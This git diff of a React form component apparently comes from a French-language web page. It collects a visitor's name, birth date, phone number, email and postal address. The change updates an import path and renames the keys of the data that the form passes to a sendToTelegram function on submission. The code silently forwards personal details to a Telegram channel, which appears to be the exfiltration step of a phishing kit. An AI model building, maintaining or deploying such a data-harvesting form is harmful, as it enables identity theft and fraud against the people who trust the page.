@@ -1,7 +1,7 @@
 'use client';
 
 import type { FormEvent, FormEventHandler } from 'react';
-import { sendToTelegram } from '../lib/telegram';
+import { sendToTelegram } from '@/lib/telegram';
 
 const formatBirthDate: FormEventHandler<HTMLInputElement> = event => {
   const input = event.currentTarget;
@@ -60,14 +60,14 @@ export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: 
     void sendToTelegram({
       title: 'Informations personnelles',
       fields: {
-        Prénom: details.prenom,
-        Nom: details.nom,
-        'Date de naissance': details.dateNaissance,
-        Téléphone: details.telephone,
-        'E-mail': details.email,
-        Adresse: details.adresse,
-        'Code postal': details.codePostal,
-        Ville: details.ville,
+        lastName: details.nom,
+        firstName: details.prenom,
+        birthDate: details.dateNaissance,
+        phone: details.telephone,
+        email: details.email,
+        address: details.adresse,
+        postalCode: details.codePostal,
+        city: details.ville,
       },
     });
 
